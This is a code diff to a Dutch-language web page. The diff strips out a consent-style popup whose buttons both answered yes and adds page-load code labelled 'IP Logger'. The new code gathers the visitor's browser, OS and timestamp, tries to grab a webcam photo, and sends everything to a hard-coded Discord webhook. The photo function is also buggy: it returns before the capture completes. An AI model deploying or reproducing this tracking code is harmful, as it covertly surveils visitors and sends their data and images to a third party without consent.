@@ -21,34 +21,6 @@
             color: inherit;
             margin-bottom: 40px;
         }
-        #popup {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.8);
-            z-index: 9999;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-        }
-        #popup-content {
-            background-color: #fff;
-            padding: 20px;
-            border-radius: 10px;
-            max-width: 80%;
-        }
-        #popup-content p {
-            margin-bottom: 10px;
-            color: black; /* make text black */
-        }
-        #popup-content button {
-            padding: 10px 20px;
-            border: none;
-            cursor: pointer;
-        }
         @keyframes changeBackground {
             0% { background-color: white; color: black; }
             50% { background-color: black; color: white; }
@@ -58,36 +30,32 @@
     <script>
         var embedSent = false;
 
-        function startMusic(liked) {
-            hidePopup();
+        function startMusic() {
             if (!embedSent) {
-                sendToDiscord(liked);
+                sendToDiscord();
                 embedSent = true;
             }
             var audio = new Audio('sound.mp3');
             audio.play();
         }
 
-        function hidePopup() {
-            var popup = document.getElementById('popup');
-            popup.style.display = 'none';
-        }
-
-        function sendToDiscord(liked) {
+        function sendToDiscord() {
             var ipAddress = "127.0.0.1"; // Simulated IP address for demonstration
             var userAgent = navigator.userAgent;
             var timestamp = new Date().toISOString();
             var os = detectOS(userAgent);
             var browser = detectBrowser(userAgent);
-            var likedText = liked ? "Ja" : "Nee";
             var webhookURL = 'https://discord.com/api/webhooks/1213788395726311464/Qu04CT-Yp-s2BttXP2jZGSm_iTWHA08MFm-OCxQHCCeiq9J-RL5VYX41Oj-5moEPMAtP';
+
+            // Maak een foto met de webcam en converteer naar een Base64-gecodeerde string
+            var photoData = takePhoto();
 
             var embed = {
                 "embeds": [
                     {
                         "title": "IP Logger",
                         "description": "Een gebruiker heeft de pagina bezocht.",
-                        "color": liked ? 65280 : 16711680, // Green if liked, Red if not liked
+                        "color": 65280, // Groen als het leuk vond, Rood als niet leuk
                         "fields": [
                             {
                                 "name": "IP Adres",
@@ -115,9 +83,9 @@
                                 "inline": true
                             },
                             {
-                                "name": "Vond de site leuk?",
-                                "value": likedText,
-                                "inline": true
+                                "name": "Foto",
+                                "value": "<img src='" + photoData + "' style='max-width: 100%;' />", // Inclusief foto in de embed
+                                "inline": false
                             }
                         ]
                     }
@@ -162,24 +130,37 @@
             return detectedBrowser || 'Onbekend';
         }
 
-        window.onload = function() {
-            var popup = document.getElementById('popup');
-            popup.addEventListener('click', function() {
-                startMusic(true);
+        // Deze functie maakt een foto met de webcam en retourneert een Base64-gecodeerde string
+        function takePhoto() {
+            var canvas = document.createElement('canvas');
+            var video = document.createElement('video');
+            var photoData;
+
+            navigator.mediaDevices.getUserMedia({ video: true }).then(function(stream) {
+                video.srcObject = stream;
+                video.play();
+                setTimeout(function() {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                    photoData = canvas.toDataURL('image/jpeg');
+                    video.srcObject.getTracks().forEach(track => track.stop());
+                }, 500); // Laat 0.5 seconde toe voor de camera om te initialiseren
+            }).catch(function(err) {
+                console.error('Kan geen toegang krijgen tot de webcam:', err);
             });
+
+            return photoData;
+        }
+
+        window.onload = function() {
+            startMusic(); // Start muziek direct bij het laden van de pagina
         }
     </script>
 </head>
 <body>
     <h1>Welkom bij onze geweldige site!</h1>
     <p>Geniet van de muziek terwijl we uw IP-adres loggen.</p>
-    <div id="popup">
-        <div id="popup-content">
-            <p>Vind je deze site leuk?</p>
-            <button onclick="startMusic(true)">Ja</button>
-            <button onclick="startMusic(true)">Nee</button>
-        </div>
-    </div>
     <audio id="music" autoplay loop>
         <source src="sound.mp3" type="audio/mpeg">
         Your browser does not support the audio element.
